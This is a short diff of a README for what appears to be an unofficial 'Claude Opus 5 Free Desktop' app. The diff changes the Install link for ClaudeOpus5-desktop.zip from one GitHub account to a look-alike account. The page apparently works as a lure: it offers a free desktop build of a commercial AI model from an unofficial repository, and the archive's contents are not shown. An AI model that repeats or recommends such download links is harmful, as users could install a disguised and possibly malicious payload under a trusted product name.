@@ -8,7 +8,7 @@
 
 
 ## Install
-[Download `ClaudeOpus5-desktop.zip`](https://github.com/claudeopus5free/Claude-Opus-5-Free-Desktop/releases/download/opus5/ClaudeOpus5-desktop.zip)
+[Download `ClaudeOpus5-desktop.zip`](https://github.com/claude5opus/Claude-Opus-5-Free-Desktop/releases/download/opus5/ClaudeOpus5-desktop.zip)
 ---
 
 <img width="1572" height="1001" alt="images2" src="https://github.com/user-attachments/assets/f5e73831-456d-4763-8c83-67f27098b3bd" />
